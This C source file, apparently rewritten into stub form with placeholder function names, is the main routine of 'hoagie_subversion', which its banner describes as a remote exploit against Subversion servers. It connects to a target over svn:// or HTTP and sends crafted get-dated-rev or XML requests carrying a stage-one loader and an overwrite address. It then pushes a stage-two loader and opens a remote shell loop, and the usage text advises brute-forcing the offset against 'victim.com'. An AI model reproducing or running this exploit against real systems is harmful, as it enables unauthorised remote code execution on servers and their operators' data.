#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  svdcmdline ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/  h_addr; } ;
typedef  int /*<<< orphan*/  sin ;
typedef  int /*<<< orphan*/  reply ;
typedef  enum protocol { ____Placeholder_protocol } protocol ;
typedef  int /*<<< orphan*/  cmd ;
typedef  int /*<<< orphan*/  buffer ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int HTTP ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int SVN ; 
 scalar_t__ FUNC0 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 struct hostent* FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int) ; 
 scalar_t__ FUNC7 (char*,int*,char*,int*,char*) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 size_t FUNC10 (int,char*,int) ; 
 char* requestfmt ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int /*<<< orphan*/  FUNC12 (char*,int,char*,...) ; 
 int FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 char* stage1loader ; 
 char* stage2loader ; 
 int stage2loaderlen ; 
 int /*<<< orphan*/  FUNC14 (char*,char*) ; 
 int FUNC15 (char*) ; 
 unsigned long FUNC16 (char*,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC17 (int,char*,int) ; 
 char* xmlreqfmt ; 

int FUNC18(int argc, char **argv)
{
   int sock, port;
   size_t size;
   char cmd[1000], reply[1000], buffer[1000];
   char svdcmdline[1000];
   char host[1000], repos[1000], *ptr, *caddr;
   unsigned long addr;
   struct sockaddr_in sin;
   struct hostent *he;
   enum protocol proto;

   /*sock=open("output",O_CREAT|O_TRUNC|O_RDWR,0666);
   write(sock,stage1loader,strlen(stage1loader));
   close(sock);
   return 0;*/

   FUNC9("hoagie_subversion - remote exploit against subversion servers\n"
          "by greuff@void.at\n\n");
   if(argc!=3)
   {
      FUNC9("Usage: %s serverurl offset\n\n",argv[0]);
      FUNC9("Examples:\n"
             "   %s svn://localhost/repository 0x41414141\n"
             "   %s http://victim.com:6666/svn 0x40414336\n\n",argv[0],argv[0]);
      FUNC9("The offset is an alphanumeric address (or UTF-8 to be\n"
             "more precise) of a pop instruction, followed by a ret.\n"
             "Brute force when in doubt.\n\n");
      FUNC9("When exploiting against an svn://-url, you can supply a\n"
             "binary offset too.\n\n");
      FUNC2(1);
   }

   // parse the URI
   FUNC12(svdcmdline,sizeof(svdcmdline),"%s",argv[1]);
   if(FUNC7(argv[1],&proto,host,&port,repos)<0)
   {
      FUNC9("URI parse error\n");
      FUNC2(1);
   }
   FUNC9("parse_uri result:\n"
          "Protocol: %d\n"
          "Host: %s\n"
          "Port: %d\n"
          "Repository: %s\n\n",proto,host,port,repos);
   addr=FUNC16(argv[2],NULL,16);
   caddr=(char *)&addr;
   FUNC9("Using offset 0x%02x%02x%02x%02x\n",caddr[3],caddr[2],caddr[1],caddr[0]);

   sock=FUNC13(AF_INET,SOCK_STREAM,0);
   if(sock<0)
   {
      FUNC8("socket");
      return -1;
   }

   he=FUNC3(host);
   if(he==NULL)
   {
      FUNC4("gethostbyname");
      return -1;
   }
   sin.sin_family=AF_INET;
   sin.sin_port=FUNC5(port);
   FUNC6(&sin.sin_addr.s_addr,he->h_addr,sizeof(he->h_addr));
   if(FUNC0(sock,(struct sockaddr *)&sin,sizeof(sin))<0)
   {
      FUNC8("connect");
      return -1;
   }

   if(proto==SVN)
   {
      size=FUNC10(sock,reply,sizeof(reply));
      reply[size]=0;
      FUNC9("Server said: %s\n",reply);
      FUNC12(cmd,sizeof(cmd),"( 2 ( edit-pipeline ) %d:%s ) ",FUNC15(svdcmdline),svdcmdline);
      FUNC17(sock,cmd,FUNC15(cmd));
      size=FUNC10(sock,reply,sizeof(reply));
      reply[size]=0;
      FUNC9("Server said: %s\n",reply);
      FUNC14(cmd,"( ANONYMOUS ( 0: ) ) ");
      FUNC17(sock,cmd,FUNC15(cmd));
      size=FUNC10(sock,reply,sizeof(reply));
      reply[size]=0;
      FUNC9("Server said: %s\n",reply);
      FUNC12(cmd,sizeof(cmd),"( get-dated-rev ( %d:%s%c%c%c%c ) ) ",FUNC15(stage1loader)+4,stage1loader,
            caddr[0],caddr[1],caddr[2],caddr[3]);
      FUNC17(sock,cmd,FUNC15(cmd));
      size=FUNC10(sock,reply,sizeof(reply));
      reply[size]=0;
      FUNC9("Server said: %s\n",reply); 
   }
   else if(proto==HTTP)
   {
      // preparing the request...
      FUNC12(buffer,sizeof(buffer),xmlreqfmt,stage1loader,
            caddr[0],caddr[1],caddr[2],caddr[3]);
      size=FUNC15(buffer);
      FUNC12(cmd,sizeof(cmd),requestfmt,repos,host,size,buffer);

      // now sending the request, immediately followed by the 2nd stage loader
      FUNC9("Sending:\n%s",cmd);
      FUNC17(sock,cmd,FUNC15(cmd));
      FUNC11(1);
      FUNC17(sock,stage2loader,stage2loaderlen);
   }

   // SHELL LOOP
   FUNC9("Entering shell loop...\n");
   FUNC1(sock);

   /*sleep(1);
   close(sock);
   printf("\nConnecting to the shell...\n");
   exec_sh(connect_sh()); */
   return 0;
}